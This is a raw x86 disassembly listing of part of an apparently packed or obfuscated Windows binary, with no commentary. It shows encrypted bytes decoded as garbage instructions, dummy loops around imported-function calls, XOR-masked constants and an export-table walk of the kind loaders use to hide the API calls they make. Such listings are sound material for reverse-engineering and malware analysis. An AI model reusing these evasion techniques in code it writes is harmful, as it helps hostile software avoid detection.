  407f62:	shr    BYTE PTR [edx+eax*2],0x9a
  407f66:	pop    eax
  407f67:	push   esp
  407f68:	xchg   ebp,eax
  407f69:	imul   ebp,DWORD PTR [edx-0x50714925],0xffffffe3
  407f70:	pusha  
  407f71:	cmp    al,0x3d
  407f73:	stos   DWORD PTR es:[edi],eax
  407f74:	adc    eax,0xfbc404e0
  407f79:	je     0x407f6e
  407f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7c:	sbb    eax,0x69549d8f
  407f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f82:	jnp    0x407f40
  407f84:	(bad)  
  407f85:	cwde   
  407f86:	loopne 0x407f0d
  407f88:	mov    dh,0x9c
  407f8a:	(bad)  [edi+0x24]
  407f8d:	mov    dl,0xba
  407f8f:	add    al,0x88
  407f91:	dec    ecx
  407f92:	das    
  407f93:	mov    edi,0x5cb21fe
  407f98:	dec    ebp
  407f99:	lds    edx,FWORD PTR [edx+0x109a9e78]
  407f9f:	dec    eax
  407fa0:	mov    al,0xd6
  407fa2:	fmul   st,st(5)
  407fa4:	imul   eax,DWORD PTR [edx+0x31],0xa
  407fa8:	mov    cl,cl
  407faa:	jns    0x407f9b
  407fac:	or     BYTE PTR [esp+ebp*8-0x77e093c],0x9e
  407fb4:	cld    
  407fb5:	sbb    cl,bh
  407fb7:	inc    edi
  407fb8:	arpl   WORD PTR ds:0xf89ea73e,dx
  407fbe:	in     eax,dx
  407fbf:	aad    0xf8
  407fc1:	add    edx,edi
  407fc3:	jns    0x408028
  407fc5:	add    al,0x4d
  407fc7:	jmp    0x40800d
  407fc9:	inc    esp
  407fca:	pcmpgtd mm7,QWORD PTR es:[ecx-0x41]
  407fcf:	call   0x3c93:0xcb37e1d4
  407fd6:	push   es
  407fd7:	sub    edx,ebp
  407fd9:	aam    0x1b
  407fdb:	lds    edx,FWORD PTR [esi-0x17b28d82]
  407fe1:	arpl   WORD PTR [edi+0x23],bx
  407fe4:	in     al,0xc0
  407fe6:	xor    al,0x80
  407fe8:	nop
  407fe9:	test   esi,esi
  407feb:	add    al,0x76
  407fed:	xchg   edx,eax
  407fee:	in     al,dx
  407fef:	mov    BYTE PTR [esi-0x4118f4fb],bl
  407ff5:	adc    ch,bl
  407ff7:	into   
  407ff8:	pop    esi
  407ff9:	push   edi
  407ffa:	fwait
  407ffb:	cs add cl,al
  407ffe:	data16 sbb cl,BYTE PTR es:[esi-0x5]
  408003:	enter  0xa150,0xc8
  408007:	push   es
  408008:	ss mov ebp,esi
  40800b:	add    al,0xf2
  40800d:	enter  0x9a0d,0x6a
  408011:	mov    BYTE PTR [edi+eiz*2],ch
  408014:	jnp    0x408042
  408016:	ret    
  408017:	and    DWORD PTR [ebx+0x4a5321ad],ebx
  40801d:	push   0x2b
  40801f:	inc    edi
  408020:	in     al,0xb5
  408022:	pop    eax
  408023:	add    esi,eax
  408025:	sahf   
  408026:	scas   al,BYTE PTR es:[edi]
  408027:	push   esp
  408028:	js     0x40809d
  40802a:	jne    0x408025
  40802c:	popa   
  40802d:	xchg   ebp,eax
  40802e:	call   0xfd11:0x8dc9968d
  408035:	mov    bl,0x3a
  408037:	mov    dl,0x79
  408039:	(bad)  
  40803c:	push   es
  40803d:	sbb    ecx,DWORD PTR [esi-0x32]
  408040:	(bad)  
  408041:	mov    al,0x7c
  408043:	jne    0x408004
  408045:	mov    edi,0xcb1bd72a
  40804a:	mov    dh,0xbb
  40804c:	sub    al,0xb5
  40804e:	outs   dx,DWORD PTR ds:[esi]
  40804f:	xor    al,0x8b
  408051:	xchg   edx,eax
  408052:	mov    dl,bl
  408054:	scas   eax,DWORD PTR es:[edi]
  408055:	out    dx,al
  408056:	push   0x37bab524
  40805b:	loop   0x408069
  40805d:	loopne 0x408065
  40805f:	jle    0x4080c8
  408061:	push   0xe7721f50
  408066:	inc    DWORD PTR [ebx]
  408068:	adc    ecx,DWORD PTR [esi]
  40806a:	iret   
  40806b:	push   0x41afc882
  408070:	mov    al,0x35
  408072:	xor    BYTE PTR [edx-0x64],bl
  408075:	add    al,0x45
  408077:	inc    edi
  408078:	pop    esp
  408079:	and    ah,ch
  40807b:	sbb    BYTE PTR [edi-0x44b96751],ah
  408081:	cmp    eax,0xe4d9606f
  408086:	push   0x15
  408088:	mov    ds:0xc4b0bd9a,al
  40808d:	popf   
  40808e:	test   al,0x16
  408090:	pop    ss
  408091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408092:	and    al,0xfe
  408094:	out    0x57,al
  408096:	push   ebx
  408097:	sub    al,0xc0
  408099:	in     al,dx
  40809a:	or     DWORD PTR [edx],esp
  40809c:	stos   BYTE PTR es:[edi],al
  40809d:	mov    esi,0xf09c8f52
  4080a2:	popf   
  4080a3:	addr16 jb 0x4080e1
  4080a6:	inc    esp
  4080a7:	sbb    ebx,DWORD PTR [edi+esi*8]
  4080aa:	fisub  DWORD PTR [eax]
  4080ac:	rol    bh,1
  4080ae:	adc    DWORD PTR [ebx-0x554760af],ebx
  4080b4:	jecxz  0x40805d
  4080b6:	xor    al,0xea
  4080b8:	or     al,0xad
  4080ba:	push   ebp
  4080bb:	out    0xca,al
  4080bd:	mov    ?,edi
  4080bf:	xchg   BYTE PTR [ecx],dl
  4080c1:	jg     0x408085
  4080c3:	vmread DWORD PTR ds:0x76fc18e9,ebp
  4080ca:	pushf  
  4080cb:	pusha  
  4080cc:	pusha  
  4080cd:	adc    al,0x21
  4080cf:	mov    al,0x7e
  4080d1:	and    edx,edi
  4080d3:	sub    dl,ah
  4080d5:	and    dl,BYTE PTR [ecx]
  4080d7:	mov    ?,eax
  4080d9:	cwde   
  4080da:	xor    BYTE PTR [ebp-0x58],bh
  4080dd:	data16 jge 0x40814e
  4080e0:	outs   dx,BYTE PTR ds:[esi]
  4080e1:	mov    ds:0x82f8bba9,eax
  4080e6:	add    bl,0xc
  4080e9:	mov    dl,0x9
  4080eb:	mov    ds:0x9c433e17,eax
  4080f0:	ds sub al,0x8a
  4080f3:	xor    DWORD PTR [edi+edi*8-0x12628806],ebx
  4080fa:	adc    al,0x48
  4080fc:	sbb    ebx,DWORD PTR [esi]
  4080fe:	jp     0x40815e
  408100:	jle    0x40813c
  408102:	add    ah,bh
  408104:	hlt    
  408105:	xchg   ecx,eax
  408106:	in     al,0x9c
  408108:	adc    ebx,DWORD PTR [edi-0x1c]
  40810b:	and    BYTE PTR [ebp+0x40ddc8a8],dh
  408111:	xlat   BYTE PTR ds:[ebx]
  408112:	and    eax,DWORD PTR [ecx-0x29]
  408115:	aam    0x75
  408117:	adc    DWORD PTR [ebx-0x65],esi
  40811a:	xchg   BYTE PTR [eax+0x1fda4337],al
  408120:	inc    edi
  408121:	int3   
  408122:	add    eax,0x877eef6b
  408127:	(bad)  
  408128:	scas   al,BYTE PTR es:[edi]
  408129:	lods   al,BYTE PTR ds:[esi]
  40812a:	and    esp,DWORD PTR ds:[ecx+0x1d66d61e]
  408131:	cmc    
  408132:	loopne 0x4081a3
  408134:	mov    esi,0x74c2c9a7
  408139:	les    ebx,FWORD PTR [edx+edi*8-0x79]
  40813d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40813e:	inc    esp
  40813f:	sub    ebx,DWORD PTR [ecx+0x11eae94d]
  408145:	loopne 0x4080f9
  408147:	in     eax,dx
  408148:	and    ch,cl
  40814a:	lea    ebp,[ebp-0x80]
  40814d:	pop    es
  40814e:	sbb    al,0x24
  408150:	and    al,0x96
  408152:	(bad)  
  408154:	xor    DWORD PTR [ecx+0x39b2cfb5],esp
  40815a:	retf   
  40815b:	push   esp
  40815c:	call   0x6a83:0xb665b1f6
  408163:	mov    esi,0x69061040
  408168:	jmp    0xe742:0xecade80d
  40816f:	inc    esi
  408170:	dec    eax
  408171:	jg     0x408103
  408173:	aad    0x8c
  408175:	push   cs
  408176:	ins    DWORD PTR es:[edi],dx
  408177:	inc    eax
  408178:	push   edx
  408179:	int3   
  40817a:	mov    ch,0x4f
  40817c:	aam    0x35
  40817e:	push   eax
  40817f:	out    0x66,eax
  408181:	in     al,dx
  408182:	fwait
  408183:	jo     0x408127
  408185:	aad    0xc8
  408187:	dec    ebp
  408188:	out    dx,al
  408189:	sbb    al,0x4f
  40818b:	adc    dl,BYTE PTR [eax-0x4]
  40818e:	pop    eax
  40818f:	and    BYTE PTR [ecx+ebp*1+0x7529131c],dh
  408196:	iret   
  408197:	test   eax,0x93f06de4
  40819c:	xchg   esi,ecx
  40819e:	xor    DWORD PTR ds:0x42801c,edi
  4081a4:	mov    edi,0x155c
  4081a9:	sub    edx,edi
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x4234f2
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42375e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x42367e
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421952
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423556
  408872:	push   0x42350e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421772
  4088d8:	mov    ebx,DWORD PTR ds:0x42179a
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421952
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
